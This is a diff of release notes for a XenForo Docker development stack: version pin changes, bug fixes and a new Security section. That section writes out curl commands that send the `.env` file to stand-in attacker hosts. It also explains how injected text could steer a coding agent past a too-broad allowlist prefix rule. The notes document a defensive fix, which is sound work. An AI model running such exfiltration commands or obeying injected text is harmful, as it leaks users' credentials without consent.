@@ -12,7 +12,9 @@ A refresh against upstream changes since July 2026: new default versions, a PHP 
 
 ### Action needed on an existing stack
 
-None is required — an existing stack keeps working on its current data. To pick up the new defaults, follow [docs/upgrading.md](docs/upgrading.md). Two of the changes it walks through are **one-way** for an existing volume: moving Elasticsearch to a newer version, and moving MariaDB to a newer major. Both are opt-in.
+**If you copied the Claude Code allowlist from `docs/ai-assisted.md` in 1.0, replace it** — it allowed `curl` in a way that let an agent send files off the machine without asking. See Security below.
+
+Nothing else is required — an existing stack keeps working on its current data. To pick up the new defaults, follow [docs/upgrading.md](docs/upgrading.md). Two of the changes it walks through are **one-way** for an existing volume: moving Elasticsearch to a newer version, and moving MariaDB to a newer major. Both are opt-in.
 
 ### Version changes
 
@@ -22,7 +24,7 @@ None is required — an existing stack keeps working on its current data. To pic
 | PHP base image | `php:<ver>-apache` (Debian follows upstream) | **`php:<ver>-apache-trixie`** | Pins the Debian release, so the OS under the image changes only when you change it. |
 | Elasticsearch | 8.15.0 | **8.19.25** | 8.15 no longer receives fixes. 8.19 is the final 8.x line and is maintained. 9.x is documented as untested with XFES. |
 | MariaDB | 11.4 (fixed) | **11.4** (now `MARIADB_VERSION`) | Unchanged default — 11.4 is an LTS supported to 2029. 11.8 and 12.3 (the newest LTS) are selectable. |
-| Mailpit | `latest` (unpinned) | **v1.33.0** | Was the only unpinned image, against the stack's own rule. Mailpit had several 2026 security releases. |
+| Mailpit | `latest` (unpinned) | **v1.33.1** | Was the only unpinned image, against the stack's own rule. Mailpit had several 2026 security releases. |
 | Xdebug | unpinned | **3.5.3** | The 3.5 line is the first with PHP 8.5 support. |
 | APCu | unpinned | **5.1.28** | Reproducible builds. |
 | Kibana example | 8.15.0 | 8.19.25 | Must match the Elasticsearch version exactly. |
@@ -61,6 +63,23 @@ None is required — an existing stack keeps working on its current data. To pic
 - **`PHP_TIMEZONE`** was read by the compose file but missing from `.env.example`.
 - **The Windows guide's fast-filesystem advice pointed at `\\wsl$\docker-desktop-data`,** a WSL distribution current Docker Desktop no longer creates. It now describes cloning into your own WSL distribution.
 - **Private vulnerability reporting was off** on the repository, although `SECURITY.md` told people to use it. It is now on.
+
+### Security
+
+Found by this release's security review and fixed before release. Most were already present in 1.0.
+
+- **The documented Claude Code allowlist let an agent send files off the machine without asking** (rated Medium). `Bash(curl http://localhost*)` also matched `curl http://localhost.attacker.example/` and `curl http://localhost --data-binary @stack/.env http://elsewhere/`, so text the agent read could steer it into sending `.env` or any readable file away, or overwriting a shell profile, with no prompt. `curl` and `wget` now ask every time, and the doc explains why URL-prefix rules are not a boundary. Present since 1.0 as `curl http://localhost:*`. **If you copied the 1.0 allowlist, remove that rule.**
+- **The same allowlist admitted every raw `cmd.php` command,** including `xf:addon-uninstall` and `xf-dev:export` (which overwrites `_output/`). It now allows only `xf:addon-list`, asks for the rest, and denies `xf-dev:export`.
+- **The `.env` deny rules were relative to the session's starting directory** (`./stack/.env`), so they missed the file when a session started elsewhere. They are now anchored to the project (`/stack/.env`).
+- **`xf.sh` reset `.env` to your default file mode on every rewrite** — usually `644`, readable by every local account — undoing the `chmod 600` from setup. It now keeps the file at `600`.
+- **Passwords no longer appear in process arguments.** The database password went on `docker compose exec` command lines (`-p…`), and the admin password was passed as `--password=…`; both were visible to any local user through `ps` while the command ran, and for the whole session with `xf db`. The database password now travels in `MYSQL_PWD`, and the admin password reaches `xf:install` on stdin. The documented `mariadb-dump` commands were changed the same way.
+- **The Docker Engine version check now runs before any port is published** — at the start of `setup`, and before `compose up` in `up`. It previously ran after `up` and not at all during `setup`.
+- **`reset` shows the exact directory it will delete, and refuses** one that is not a XenForo webroot (no `src/XF.php`), is `XF_SOURCE`, a filesystem root, your home directory or `stack/` itself. Relevant because `XF_WEBROOT` may now be an absolute path on Windows.
+- **The port-exposure check now flags any non-loopback address,** not only `0.0.0.0` and `[::]` — a binding to a specific LAN address is just as reachable. CI also rejects `network_mode: host`.
+- **`defaultaddon` accepts only an add-on id.** A `'` in its argument could end the PHP string it is written into in `config.php`.
+- **`xf.ps1` refuses a double quote** in `XF_BOARD_TITLE`, `XF_ADMIN_EMAIL` or `XF_ADMIN_USER`, which Windows PowerShell 5.1 would split into extra installer arguments.
+- **Mailpit pinned to v1.33.1** instead of v1.33.0; v1.33.1 limits the remote stylesheets its HTML check fetches.
+- `xf db` now passes extra arguments to the client, so the documented `./xf.sh db -e "SELECT ..."` runs the query instead of opening a prompt.
 
 ### Documentation
 
